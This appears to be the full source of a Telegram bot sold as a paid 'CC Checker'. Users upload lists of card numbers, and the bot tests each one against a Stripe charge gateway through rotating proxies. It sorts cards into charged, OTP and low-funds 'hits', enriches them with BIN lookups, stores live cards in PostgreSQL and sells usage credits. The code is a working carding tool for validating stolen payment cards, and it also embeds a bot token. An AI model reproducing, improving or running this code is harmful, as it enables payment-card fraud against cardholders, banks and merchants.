import requests
import telebot
import time
import os
import threading
import random
import json
import psycopg2
import psycopg2.pool
from telebot import types
from gatet import Tele
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ==========================================
# ========== CONFIGURATION SECTION ==========
# ==========================================
TOKEN = '8910582957:AAEtLRnEePDQ-xA81fOGMjyWpG8NeOzbzP0'
ADMIN_ID = '5831292144'
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
DEVELOPER = "@cyber_404io"
BOT_NAME = "Cyber V"

# PostgreSQL Configuration
DB_CONFIG = {
    'host': 'localhost',
    'port': 5432,
    'database': 'cyber_v',
    'user': 'postgres',
    'password': 'your_password',
    'minconn': 5,
    'maxconn': 20
}

# Connection Pool
db_pool = None

def get_db_connection():
    """Get connection from pool with auto-reconnect."""
    global db_pool
    if db_pool is None:
        db_pool = psycopg2.pool.ThreadedConnectionPool(**DB_CONFIG)
    try:
        conn = db_pool.getconn()
        # Test connection
        conn.cursor().execute("SELECT 1")
        return conn
    except Exception:
        # Recreate pool if connection lost
        try:
            if db_pool:
                db_pool.closeall()
        except:
            pass
        db_pool = psycopg2.pool.ThreadedConnectionPool(**DB_CONFIG)
        return db_pool.getconn()

def return_db_connection(conn):
    """Return connection to pool."""
    global db_pool
    if db_pool:
        try:
            db_pool.putconn(conn)
        except:
            pass

# ==========================================
# ========== DATABASE (PostgreSQL) =========
# ==========================================
def init_db():
    """Initializes PostgreSQL database tables."""
    conn = get_db_connection()
    try:
        c = conn.cursor()
        
        # Users Table
        c.execute('''CREATE TABLE IF NOT EXISTS users (
                     user_id BIGINT PRIMARY KEY,
                     credits INTEGER DEFAULT 0,
                     ban_until BIGINT DEFAULT 0,
                     created_at TIMESTAMP DEFAULT NOW()
                     )''')
        
        # Check History Table
        c.execute('''CREATE TABLE IF NOT EXISTS check_history (
                     id SERIAL PRIMARY KEY,
                     user_id BIGINT REFERENCES users(user_id),
                     total_cards INTEGER,
                     charged INTEGER DEFAULT 0,
                     otp INTEGER DEFAULT 0,
                     low_funds INTEGER DEFAULT 0,
                     declined INTEGER DEFAULT 0,
                     net_err INTEGER DEFAULT 0,
                     cvv_err INTEGER DEFAULT 0,
                     duration_sec REAL,
                     status TEXT DEFAULT 'completed',
                     created_at TIMESTAMP DEFAULT NOW()
                     )''')
        
        # Live Cards Table
        c.execute('''CREATE TABLE IF NOT EXISTS live_cards (
                     id SERIAL PRIMARY KEY,
                     user_id BIGINT REFERENCES users(user_id),
                     card_number TEXT,
                     status TEXT,
                     amount TEXT,
                     gateway_response TEXT,
                     bin TEXT,
                     country TEXT,
                     bank TEXT,
                     card_type TEXT,
                     created_at TIMESTAMP DEFAULT NOW()
                     )''')
        
        # Credit Transactions Table
        c.execute('''CREATE TABLE IF NOT EXISTS credit_transactions (
                     id SERIAL PRIMARY KEY,
                     user_id BIGINT REFERENCES users(user_id),
                     amount INTEGER,
                     reason TEXT,
                     admin_id BIGINT,
                     created_at TIMESTAMP DEFAULT NOW()
                     )''')
        
        # Indexes for Performance
        c.execute("CREATE INDEX IF NOT EXISTS idx_users_ban ON users(ban_until)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_history_user ON check_history(user_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_history_date ON check_history(created_at)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_live_cards_user ON live_cards(user_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_live_cards_date ON live_cards(created_at)")
        
        # Admin Setup
        c.execute('''INSERT INTO users (user_id, credits, ban_until) 
                     VALUES (%s, 999999, 0) 
                     ON CONFLICT (user_id) DO NOTHING''', (int(ADMIN_ID),))
        
        conn.commit()
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Database initialized successfully.")
    except Exception as e:
        print(f"[DB Error] init_db: {e}")
        conn.rollback()
    finally:
        return_db_connection(conn)

def get_user_data(user_id):
    """Retrieves user data from PostgreSQL."""
    conn = get_db_connection()
    try:
        c = conn.cursor()
        c.execute("SELECT credits, ban_until FROM users WHERE user_id = %s", (int(user_id),))
        res = c.fetchone()
        if not res:
            c.execute("INSERT INTO users (user_id, credits, ban_until) VALUES (%s, 0, 0)", (int(user_id),))
            conn.commit()
            res = (0, 0)
        return {"credits": res[0], "ban_until": res[1]}
    except Exception as e:
        print(f"[DB Error] get_user_data: {e}")
        return {"credits": 0, "ban_until": 0}
    finally:
        return_db_connection(conn)

def update_credits(user_id, amount):
    """Updates user credits."""
    conn = get_db_connection()
    try:
        c = conn.cursor()
        c.execute('''UPDATE users SET credits = credits + %s 
                     WHERE user_id = %s''', (amount, int(user_id)))
        
        # Log transaction
        c.execute('''INSERT INTO credit_transactions (user_id, amount, reason, admin_id)
                     VALUES (%s, %s, %s, %s)''',
                  (int(user_id), amount, 'system' if amount < 0 else 'admin', int(ADMIN_ID)))
        
        conn.commit()
    except Exception as e:
        print(f"[DB Error] update_credits: {e}")
        conn.rollback()
    finally:
        return_db_connection(conn)

def penalty_user(user_id, rate):
    """Applies penalty: 50% credit deduction and 30-minute ban."""
    conn = get_db_connection()
    try:
        c = conn.cursor()
        c.execute('''UPDATE users SET credits = credits / 2, 
                     ban_until = %s WHERE user_id = %s''',
                  (int(time.time() + 1800), int(user_id)))
        conn.commit()
    except Exception as e:
        print(f"[DB Error] penalty_user: {e}")
        conn.rollback()
    finally:
        return_db_connection(conn)
    
    warning = f"""
⚠️ <b>SYSTEM ALERT: SPAM DETECTED!</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Your session has been terminated. 
<b>CVV Error Rate:</b> {rate:.1f}%

<b>Penalties Applied:</b>
- 50% Credit Deduction
- 30 Minutes Temporary Ban
━━━━━━━━━━━━━━━━━━━━━━━━
<b>Reason:</b> High frequency of generated or incorrect card testing detected.
<b>Dev:</b> {DEVELOPER}
"""
    try:
        bot.send_message(user_id, warning)
    except:
        pass

def save_check_history(user_id, total, charged, otp, low, declined, net_err, cvv_err, duration, status='completed'):
    """Saves check session history."""
    conn = get_db_connection()
    try:
        c = conn.cursor()
        c.execute('''INSERT INTO check_history 
                     (user_id, total_cards, charged, otp, low_funds, declined, net_err, cvv_err, duration_sec, status)
                     VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)''',
                  (int(user_id), total, charged, otp, low, declined, net_err, cvv_err, duration, status))
        conn.commit()
    except Exception as e:
        print(f"[DB Error] save_check_history: {e}")
        conn.rollback()
    finally:
        return_db_connection(conn)

def save_live_card(user_id, cc, status, amount, response_text, bin_num, country, bank, card_type):
    """Saves live card hit."""
    conn = get_db_connection()
    try:
        c = conn.cursor()
        c.execute('''INSERT INTO live_cards 
                     (user_id, card_number, status, amount, gateway_response, bin, country, bank, card_type)
                     VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)''',
                  (int(user_id), cc, status, amount, response_text, bin_num, country, bank, card_type))
        conn.commit()
    except Exception as e:
        print(f"[DB Error] save_live_card: {e}")
        conn.rollback()
    finally:
        return_db_connection(conn)

# Initialize Database
init_db()

# ==========================================
# ========== UTILITY FUNCTIONS SECTION =======
# ==========================================
def is_banned(user_id):
    """Checks if a user is currently banned."""
    data = get_user_data(user_id)
    if time.time() < data["ban_until"]:
        remaining = int((data["ban_until"] - time.time()) / 60)
        return True, remaining
    return False, 0

def get_proxies():
    """Returns a random proxy from proxy.txt."""
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
            if proxies:
                p = random.choice(proxies)
                if p.startswith("http"): return {"http": p, "https": p}
                return {"http": f"http://{p}", "https": f"http://{p}"}
    return None

def typewriter_msg(chat_id, text):
    """Sends a message with typewriter animation effect."""
    msg = bot.send_message(chat_id, "⌛")
    curr = ""
    for char in text:
        curr += char
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=curr + " ▮")
            time.sleep(0.05)
        except: pass
    try:
        bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=curr)
    except:
        pass

def get_progress_bar(current, total):
    """Calculates progress bar and percentage."""
    if total == 0: return '▭' * 10, 0
    filled = int(10 * current // total)
    bar = '▬' * filled + '▭' * (10 - filled)
    perc = int((current / total) * 100)
    return bar, perc

# ==========================================
# ========== UI COMPONENTS SECTION ==========
# ==========================================
def get_main_menu(user_name, user_id, credits):
    """Returns the main menu text and inline keyboard."""
    text = f"""
<b>⚡ {BOT_NAME} - Professional CC Checker</b>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>👤 User:</b> <code>{user_name}</code>
<b>🆔 ID:</b> <code>{user_id}</code>
<b>💳 Credits:</b> <code>{credits}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
Please send a <b>.txt</b> file to start checking.
<b>Dev:</b> {DEVELOPER}
"""
    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("👤 User Info", callback_data="user_info")
    btn2 = types.InlineKeyboardButton("📜 Rule", callback_data="rule")
    btn3 = types.InlineKeyboardButton("💎 Plan", callback_data="plan")
    btn4 = types.InlineKeyboardButton("📋 History", callback_data="history")
    btn5 = types.InlineKeyboardButton("🎯 My Hits", callback_data="my_hits")
    markup.row(btn1, btn2)
    markup.row(btn3)
    markup.row(btn4, btn5)
    return text, markup

# ==========================================
# ========== BOT COMMAND HANDLERS ===========
# ==========================================
@bot.message_handler(commands=["start"])
def start(message):
    uid = str(message.chat.id)
    banned, mins = is_banned(uid)
    if banned:
        bot.reply_to(message, f"🚫 <b>Access Denied!</b>\nYou are temporarily banned for {mins} more minutes.")
        return

    data = get_user_data(uid)
    if data["credits"] <= 0 and uid != ADMIN_ID:
        typewriter_msg(message.chat.id, f"Bot owner is {DEVELOPER}. You need credits to use this bot.")
        return

    text, markup = get_main_menu(message.from_user.first_name, uid, data["credits"])
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ["user_info", "rule", "plan", "history", "my_hits", "back_to_main"])
def menu_cb(call):
    """Handles multi-page navigation with Back button."""
    uid = str(call.message.chat.id)
    data = get_user_data(uid)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main"))
    
    if call.data == "back_to_main":
        text, markup = get_main_menu(call.from_user.first_name, uid, data['credits'])
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, reply_markup=markup)
        bot.answer_callback_query(call.id)
        return
    
    elif call.data == "user_info":
        text = f"""
<b>👤 USER INFORMATION</b>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>Name:</b> {call.from_user.first_name}
<b>ID:</b> <code>{uid}</code>
<b>Credits:</b> <code>{data['credits']}</code>
<b>Status:</b> {"Admin" if uid == ADMIN_ID else "Premium User"}
━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    elif call.data == "rule":
        text = f"""
<b>📜 BOT RULES</b>
━━━━━━━━━━━━━━━━━━━━━━━━
1. No Gen/Fake cards allowed.
2. High CVV Error rate = Auto-ban.
3. One file at a time.
4. Don't spam the gateway.
━━━━━━━━━━━━━━━━━━━━━━━━
Violation will lead to 50% credit penalty!
"""
    
    elif call.data == "plan":
        text = f"""
<b>💎 PREMIUM PLANS</b>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>Basic:</b> 100 Credits - 5$
<b>Pro:</b> 500 Credits - 20$
<b>Unlimited:</b> Contact Admin
━━━━━━━━━━━━━━━━━━━━━━━━
<b>Contact:</b> {DEVELOPER}
"""
    
    elif call.data == "history":
        conn = get_db_connection()
        try:
            c = conn.cursor()
            c.execute("SELECT * FROM check_history WHERE user_id=%s ORDER BY created_at DESC LIMIT 10", (int(uid),))
            rows = c.fetchall()
            if not rows:
                text = "<b>📋 No check history found.</b>"
            else:
                text = "<b>📋 CHECK HISTORY (Last 10)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
                for r in rows:
                    text += f"📅 {r[10].strftime('%d/%m/%y %H:%M')} | Cards: {r[2]}\n"
                    text += f"   🔥{r[3]} ✅{r[4]} 🥀{r[5]} ❌{r[6]} | Status: {r[9]}\n"
        except Exception as e:
            text = f"<b>❌ Error loading history:</b> {e}"
        finally:
            return_db_connection(conn)
    
    elif call.data == "my_hits":
        conn = get_db_connection()
        try:
            c = conn.cursor()
            c.execute("SELECT * FROM live_cards WHERE user_id=%s ORDER BY created_at DESC LIMIT 20", (int(uid),))
            rows = c.fetchall()
            if not rows:
                text = "<b>🎯 No saved hits found.</b>"
            else:
                text = "<b>🎯 YOUR SAVED HITS (Last 20)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
                for r in rows:
                    text += f"💳 <code>{r[2][:6]}xxxx{r[2][-4:]}</code>\n"
                    text += f"   <b>{r[3]}</b> | {r[6]} | {r[7]} | {r[10].strftime('%d/%m/%y')}\n"
        except Exception as e:
            text = f"<b>❌ Error loading hits:</b> {e}"
        finally:
            return_db_connection(conn)
    
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, reply_markup=markup)
    bot.answer_callback_query(call.id)

# ========== ADMIN COMMANDS ==========
@bot.message_handler(commands=["addcredit"])
def add_credit(message):
    if str(message.chat.id) != ADMIN_ID: 
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "Usage: /addcredit [user_id] [amount]")
            return
        target_uid = args[1]
        amount = int(args[2])
        update_credits(target_uid, amount)
        bot.reply_to(message, f"✅ Added {amount} credits to {target_uid}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}\nUsage: /addcredit [user_id] [amount]")

@bot.message_handler(commands=["rmcredit"])
def rm_credit(message):
    if str(message.chat.id) != ADMIN_ID: 
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "Usage: /rmcredit [user_id]")
            return
        target_uid = args[1]
        conn = get_db_connection()
        try:
            c = conn.cursor()
            c.execute("UPDATE users SET credits = 0 WHERE user_id = %s", (int(target_uid),))
            conn.commit()
            bot.reply_to(message, f"✅ Credits cleared for {target_uid}")
        finally:
            return_db_connection(conn)
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=["stats"])
def stats(message):
    if str(message.chat.id) != ADMIN_ID: 
        return
    conn = get_db_connection()
    try:
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM check_history")
        total_checks = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM live_cards")
        total_hits = c.fetchone()[0]
        c.execute("SELECT COALESCE(SUM(credits), 0) FROM users")
        total_credits = c.fetchone()[0]
    finally:
        return_db_connection(conn)
    
    text = f"""
<b>📊 BOT STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>Total Users:</b> {total_users}
<b>Total Checks:</b> {total_checks}
<b>Total Hits Saved:</b> {total_hits}
<b>Total Credits Active:</b> {total_credits}
━━━━━━━━━━━━━━━━━━━━━━━━
"""
    bot.reply_to(message, text)

# ==========================================
# ========== CHECKER ENGINE SECTION ==========
# ==========================================
user_sessions = {}
session_lock = threading.Lock()

def check_card(cc, session):
    """Core function to check a single card using the gateway."""
    # Check if session is still running
    if not session['is_running']:
        return
    
    proxy = get_proxies()
    try:
        # Call the gateway from gatet.py
        res = str(Tele(cc, proxies=proxy))
        # Terminal Logging
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {cc} -> {res}")
    except Exception as e:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {cc} -> Error: {e}")
        session['net_err'] += 1
        return

    # Parse gateway response
    parts = res.split('|')
    last = parts[0].strip() if parts else "Unknown"
    amt = parts[-2].strip() if len(parts) >= 2 else "0.00"
    rt = parts[-1].strip() if len(parts) >= 3 else "0.0"

    last_l = last.lower()
    session['processed'] += 1
    session['last_cc'] = cc
    
    is_live = False
    st = ""
    
    # Classification Logic
    if any(x in last_l for x in ["thank", "success", "complete", "succeeded", "donation"]):
        session['charged'] += 1
        session['charged_list'].append(cc)
        is_live, st = True, "CHARGED 🔥"
    elif any(x in last_l for x in ["3d", "verifying", "action_required", "authenticate"]):
        session['otp'] += 1
        session['otp_list'].append(cc)
        is_live, st = True, "3DS / OTP ✅"
    elif any(x in last_l for x in ["insufficient", "low funds"]):
        session['low'] += 1
        session['low_list'].append(cc)
        is_live, st = True, "LOW FUNDS 🥀"
    elif "security code" in last_l or "cvv" in last_l:
        session['cvv_err'] += 1
        session['declined'] += 1
    elif "network error" in last_l or "proxy error" in last_l:
        session['net_err'] += 1
    else:
        session['declined'] += 1

    # Anti-Spam / CVV Error Detection Logic
    if session['processed'] >= 10:
        cvv_rate = (session['cvv_err'] / session['processed']) * 100
        if cvv_rate > 50 and not session.get('penalized', False):
            session['penalized'] = True
            session['is_running'] = False
            penalty_user(session['user_id'], cvv_rate)

    # Notification for Live Hits
    if is_live and session['is_running']:
        try:
            b = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=5).json()
            bank = b.get('bank', {}).get('name', 'UNKNOWN')
            cn = b.get('country', {}).get('name', 'UNKNOWN')
            emj = b.get('country', {}).get('emoji', '🏳️')
            dicr = b.get('scheme', 'UNKNOWN')
            typ = b.get('type', 'UNKNOWN')
        except: 
            bank, cn, emj, dicr, typ = "UNKNOWN", "UNKNOWN", "🏳️", "UNKNOWN", "UNKNOWN"
        
        # Convert to uppercase for better display
        bank = bank.upper() if bank else "UNKNOWN"
        cn = cn.upper() if cn else "UNKNOWN"
        dicr = dicr.upper() if dicr else "UNKNOWN"
        typ = typ.upper() if typ else "UNKNOWN"
        
        # Save to Database
        try:
            save_live_card(session['user_id'], cc, st, amt, last, cc[:6], cn, bank, f"{dicr}-{typ}")
        except Exception as e:
            print(f"[DB Error] save_live_card in check_card: {e}")
        
        msg = f"""
<b>CC</b> ☛ <code>{cc}</code>
<b>Status</b> ☛ <b>{st}</b>
<b>Gate</b> ☛ <b>Stripe Charge ${amt}</b>
<b>Response</b> ☛ <b>{last}</b>
<b>❖ BIN</b> ☛ <b>{cc[:6]} - {cn} {emj}</b>
<b>❖ Details</b> ☛ <b>{dicr}-{typ}</b>
<b>❖ Bank</b> ☛ <b>{bank}</b>
<b>⏱️ Taken</b> <b>{rt}s</b>
<b>🤖 BY:</b> {DEVELOPER}"""
        
        try:
            bot.send_message(session['chat_id'], msg, parse_mode="HTML")
        except Exception as e:
            print(f"[Bot Error] send_live_card: {e}")

def update_ui_thread(chat_id, msg_id, session):
    """Thread function to update the Progress UI every 5 seconds."""
    uid = session['user_id']
    
    while session['is_running']:
        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton(f"🔥 Charged: {session['charged']}", callback_data='x'),
                   types.InlineKeyboardButton(f"✅ OTP: {session['otp']}", callback_data='x'))
        markup.row(types.InlineKeyboardButton(f"🥀 Low: {session['low']}", callback_data='x'),
                   types.InlineKeyboardButton(f"❌ Dead: {session['declined']}", callback_data='x'))
        markup.row(types.InlineKeyboardButton(f"🌐 NetErr: {session['net_err']}", callback_data='x'))
        markup.row(types.InlineKeyboardButton(f"🛑 STOP CHECK", callback_data=f"stop_{uid}"))

        elapsed = round(time.time() - session['start'], 1)
        bar, perc = get_progress_bar(session['processed'], session['total'])

        text = f"""<b>𝐂𝐘𝐁𝐄𝐑 𝐕 𝐌𝐀𝐒𝐒</b>

<b>𝘾𝙖𝙧𝙙</b> ➲ <code>{session['last_cc']}</code>
<b>𝙂𝙖𝙩𝙚𝙬𝙖𝙮</b> ➲ <code>Stripe Charged</code>
<b>𝘼𝙢𝙤𝙪𝙣𝙩</b> ➲ <code>{session['total']}</code>
<pre>𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➲ {bar} {perc}%</pre>
<b>𝙏𝙤𝙩𝙖𝙡 𝙏𝙖𝙠𝙚𝙣</b> ➲ <code>{elapsed}s</code>"""
        
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text, reply_markup=markup, parse_mode="HTML")
        except Exception as e:
            print(f"[UI Error] update_ui_thread: {e}")
        time.sleep(5)

@bot.message_handler(content_types=["document"])
def handle_docs(message):
    """Handles incoming .txt files for checking."""
    uid = str(message.chat.id)
    banned, mins = is_banned(uid)
    if banned: 
        return bot.reply_to(message, f"🚫 Banned for {mins}m")
    
    user_data = get_user_data(uid)
    if user_data["credits"] <= 0 and uid != ADMIN_ID: 
        return bot.reply_to(message, "❌ Insufficient Credits. Please buy more.")

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        lines = [l.strip() for l in downloaded.decode().split('\n') if l.strip()]
    except Exception as e:
        return bot.reply_to(message, f"❌ Error reading file: {e}")
    
    if not lines:
        return bot.reply_to(message, "❌ File is empty.")

    # Initialize Session with thread safety
    with session_lock:
        user_sessions[uid] = {
            'user_id': uid, 
            'chat_id': message.chat.id, 
            'total': len(lines),
            'charged': 0, 'otp': 0, 'low': 0, 'declined': 0, 
            'net_err': 0, 'processed': 0, 'cvv_err': 0,
            'charged_list': [], 'otp_list': [], 'low_list': [],
            'is_running': True, 'manual_stop': False, 
            'start': time.time(), 'last_cc': 'WAITING...',
            'stop_requested': False, 'penalized': False, 'message_id': 0
        }
    
    session = user_sessions[uid]
    msg = bot.reply_to(message, "🚀 <b>Starting Ultimate Master Check...</b>", parse_mode="HTML")
    msg_id = msg.message_id
    session['message_id'] = msg_id
    
    # Start UI Updater Thread
    ui_thread = threading.Thread(target=update_ui_thread, args=(message.chat.id, msg_id, session), daemon=True)
    ui_thread.start()

    # Start Checking Loop (Single Worker for stability)
    with ThreadPoolExecutor(max_workers=1) as executor:
        for cc in lines:
            if not session['is_running']:
                session['manual_stop'] = True
                break
            executor.submit(check_card, cc, session)
            time.sleep(1.5) # Smart delay

    # Final Cleanup and Summary
    session['is_running'] = False
    time.sleep(1)
    
    if not session.get('penalized', False):
        duration = round(time.time() - session['start'], 2)
        status_title = "🛑 STOPPED BY USER" if session['manual_stop'] else "✅ SUCCESSFULLY COMPLETED!"
        
        # Save to History
        try:
            save_check_history(uid, session['total'], session['charged'], 
                              session['otp'], session['low'], session['declined'], 
                              session['net_err'], session['cvv_err'], duration,
                              'stopped' if session['manual_stop'] else 'completed')
        except Exception as e:
            print(f"[DB Error] save_check_history in handle_docs: {e}")
        
        final_ui = f"""
<b>{status_title}</b>
<b>📅 Date:</b> {datetime.now().strftime('%d %b %Y, %I:%M %p')}
<b>⏱️ Time Taken:</b> {duration}s

<b>📊 SUMMARY REPORT</b>
<pre>
TOTAL CARDS : {session['total']}
━━━━━━━━━━━━━━━━━━━━
CHARGED     : {session['charged']}
OTP / CVV   : {session['otp']}
LOW FUNDS   : {session['low']}
DECLINED    : {session['declined']}
NET ERR     : {session['net_err']}
</pre>
<b>🤖 BY:</b> {DEVELOPER}"""
        
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg_id, text=final_ui, parse_mode="HTML")
        except Exception as e:
            print(f"[UI Error] final_ui: {e}")
            bot.send_message(message.chat.id, final_ui)

        # Send Result Files
        for lst, name in [(session['charged_list'], 'CHARGED'), 
                         (session['otp_list'], '3DS_OTP'), 
                         (session['low_list'], 'LOW_FUNDS')]:
            if lst:
                try:
                    res_path = f"{name}_{uid}.txt"
                    with open(res_path, "w") as f: 
                        f.write("\n".join(lst))
                    with open(res_path, "rb") as f: 
                        bot.send_document(message.chat.id, f, caption=f"✅ {name} Results")
                    os.remove(res_path)
                except Exception as e:
                    print(f"[File Error] {name}: {e}")

        # Deduct 1 credit per file check (Admin exempt)
        if uid != ADMIN_ID: 
            update_credits(uid, -1)
    
    # Clean session
    with session_lock:
        if uid in user_sessions:
            del user_sessions[uid]

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def stop_cb(call):
    """Handles the immediate stop button - user specific."""
    try:
        uid = call.data.split('_')[1]
        
        with session_lock:
            if uid in user_sessions:
                user_sessions[uid]['is_running'] = False
                user_sessions[uid]['stop_requested'] = True
                bot.answer_callback_query(call.id, "🛑 STOPPING IMMEDIATELY...")
            else:
                bot.answer_callback_query(call.id, "⚠️ No active session found.")
    except Exception as e:
        print(f"[Stop Error] {e}")
        bot.answer_callback_query(call.id, "❌ Error stopping check.")

# ==========================================
# ========== MAIN ENTRY POINT ================
# ==========================================
if __name__ == "__main__":
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {BOT_NAME} is starting with PostgreSQL...")
    print(f"[{datetime.now().strftime('%H:%M:%S')}] Developer: {DEVELOPER}")
    
    # Remove webhook and start polling
    bot.remove_webhook()
    
    while True:
        try:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Bot polling started...")
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Polling Error: {e}")
            time.sleep(15)
